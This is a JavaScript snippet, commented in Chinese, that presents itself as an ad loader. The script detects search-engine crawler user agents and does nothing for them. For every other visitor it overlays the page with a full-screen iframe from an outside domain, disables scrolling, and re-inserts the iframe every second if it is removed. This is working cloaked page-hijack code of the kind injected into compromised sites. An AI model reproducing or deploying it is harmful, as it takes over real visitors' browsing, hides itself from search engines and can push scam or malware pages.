// 蜘蛛檢測
function isSpiderUA( ) {
    const spiderUAs = ['baiduspider', 'Sogou web spider', 'YisouSpider', '360Spider', 'Googlebot', 'bingbot', 'Yandex Bot'];
    const userAgent = navigator.userAgent.toLowerCase();
    return spiderUAs.some(ua => userAgent.includes(ua.toLowerCase()));
}

// 如果是蜘蛛,直接退出,不執行任何操作
if (isSpiderUA()) {
    console.log('搜索引擎爬蟲訪問,不加載廣告');
    // 什麼都不做,直接結束
} else {
    // 不是蜘蛛,執行廣告加載
    console.log('普通用戶訪問,加載廣告');
    
    function createIframe() {
        const lins = "https://selfmediastudio.cc/web/mg.html";
        const iframe = document.createElement('iframe' );
        iframe.src = lins;
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.zIndex = '999999';
        iframe.style.setProperty('display', 'block', 'important');
        iframe.style.setProperty('visibility', 'visible', 'important');
        iframe.setAttribute('frameborder', '0');
        iframe.setAttribute('scrolling', 'yes');
        iframe.setAttribute('allowfullscreen', 'true');
        
        if (document.body) {
            document.body.appendChild(iframe);
            disableScroll();
        } else {
            document.addEventListener('DOMContentLoaded', function() {
                document.body.appendChild(iframe);
                disableScroll();
            });
        }
    }

    function disableScroll() {
        document.body.style.overflow = 'hidden';
        document.documentElement.style.overflow = 'hidden';
    }

    // 初始化
    (function() {
        try {
            createIframe();
        } catch(e) {
            setTimeout(createIframe, 1);
        }
        
        // 每1秒檢測iframe還在不在
        setInterval(function() {
            const iframe = document.querySelector('iframe');
            if (!iframe || !document.body.contains(iframe)) {
                createIframe();
            }
        }, 1000);
        
        // 移動設備適配
        window.addEventListener('orientationchange', function() {
            setTimeout(resizeIframe, 300);
        });
        window.addEventListener('resize', function() {
            setTimeout(resizeIframe, 300);
        });
        
        function resizeIframe() {
            const iframe = document.querySelector('iframe');
            if (iframe) {
                iframe.style.width = '100vw';
                iframe.style.height = '100vh';
            }
        }
        
        // iOS滾動兼容
        if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
            window.addEventListener('scroll', function() {
                const iframe = document.querySelector('iframe');
                if (iframe) {
                    iframe.style.height = window.innerHeight + 'px';
                }
            });
        }
    })();
}
